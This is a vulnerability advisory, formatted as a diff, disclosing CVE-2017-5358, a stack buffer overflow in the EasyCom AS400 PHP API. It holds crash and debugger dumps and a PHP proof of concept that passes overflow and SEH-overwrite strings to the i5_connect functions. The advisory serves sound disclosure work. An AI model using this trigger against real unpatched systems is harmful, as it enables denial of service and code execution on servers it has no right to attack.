@@ -1,0 +1,167 @@
+[+] Credits: John Page AKA Hyp3rlinX
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/EASYCOM-PHP-API-BUFFER-OVERFLOW.txt
+[+] ISR: ApparitionSec             
+
+
+Vendor:
+================
+easycom-aura.com
+
+
+
+Product:
+===========================
+EASYCOM AS400 (iBMI) PHP API 
+EasycomPHP_4.0029.iC8im2.exe
+
+EASYCOM is the middleware which provides native access to IBMi data and programs. With its excellent performance and strict compliance
+with IBMi security regulations, this technology facilitates development of Internet, mobile and client/server applications in
+Windows, Linux, and IBMi.
+
+
+EasyCom tested here requires older version of PHP.
+
+Setup test environment:
+
+Windows 7
+XAMPP 1.7.3
+PHP 5.3.1 (cli) (built: Nov 20 2009 17:26:32)
+Copyright (c) 1997-2009 The PHP Group
+Zend Engine v2.3.0
+
+PHP compiled module API=20090626 (need to use for EasyCom IBM DLL)
+
+
+Vulnerability Type:
+=========================
+API Stack Buffer Overflow
+
+
+
+CVE Reference:
+==============
+CVE-2017-5358
+
+
+
+Security Issue:
+================
+EasyCom PHP API suffers from multiple Buffer Overflow entry points, which can result in arbitrary code execution on affected system.
+Below I provide some proof of concept details for a few of them.
+
+
+EAX 00000000
+ECX 41414141
+EDX 771D6ACD ntdll.771D6ACD
+EBX 00000000
+ESP 00C0F238
+EBP 00C0F258
+ESI 00000000
+EDI 00000000
+EIP 41414141
+
+C 0  ES 002B 32bit 0(FFFFFFFF)
+P 1  CS 0023 32bit 0(FFFFFFFF)
+A 0  SS 002B 32bit 0(FFFFFFFF)
+Z 1  DS 002B 32bit 0(FFFFFFFF)
+S 0  FS 0053 32bit 7EFDD000(FFF)
+T 0  GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
+
+
+SEH chain of main thread
+Address    SE handler
+00C0F354   kernel32.7600410E
+00C0FF78   42424242
+52525252   *** CORRUPT ENTRY ***
+
+WinDbg dump...
+
+(720.a70): Access violation - code c0000005 (first/second chance not available)
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll - 
+eax=00000000 ebx=00000000 ecx=41414141 edx=77316acd esi=00000000 edi=00000000
+eip=41414141 esp=004111e8 ebp=00411208 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+41414141 ??              ???
+0:000> !load winext/msec
+0:000> !exploitable
+
+!exploitable 1.6.0.0
+Exploitability Classification: EXPLOITABLE
+Recommended Bug Title: Exploitable - Data Execution Prevention Violation starting at Unknown Symbol @ 0x0000000041414141
+called from ntdll!RtlDosSearchPath_Ustr+0x0000000000000ada (Hash=0x05cdf8a7.0xce7d7411)
+
+User mode DEP access violations are exploitable.
+
+
+PHP Crash:
+=============
+
+Problem signature:
+  Problem Event Name:	BEX
+  Application Name:	php.exe
+  Application Version:	5.3.1.0
+  Application Timestamp:	4b06c430
+  Fault Module Name:	StackHash_e98d
+  Fault Module Version:	0.0.0.0
+  Fault Module Timestamp:	00000000
+  Exception Offset:	41414141
+  Exception Code:	c0000005
+  Exception Data:	00000008
+  OS Version:	6.1.7601.2.1.0.256.48
+
+
+
+Exploit/POC:
+===============
+php_Easycom5_3_0.dll 0day vuln POC minus the exploit, I'm bored goin to the park.
+
+<?php
+
+/* Basic connection to an AS400 iBMI System  */
+
+$payload=str_repeat("A", 4000);                                          #BOOM!
+$payload=str_repeat("A",1868)."RRRRBBBB".str_repeat("\x90",100);         #SEH
+
+$conn = i5_connect($payload, "QPGMR", "PASSW") or die(i5_errormsg());    #VULN 
+$conn = i5_pconnect($payload, 'QSECOFR', 'password', array() );          #VULN 
+$conn = i5_private_connect($payload, $user, $password, array());         #VULN 
+
+echo 'EasyCom PHP API 0day ' . $conn;
+
+?>
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+==========
+High
+
+
+
+Disclosure Timeline:
+======================================
+Vendor Notification: December 22, 2016
+Vendor acknowledgement: December 23, 2016
+Vendor Release Fix/Version February 20, 2017
+February 22, 2017 : Public Disclosure
+
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. 
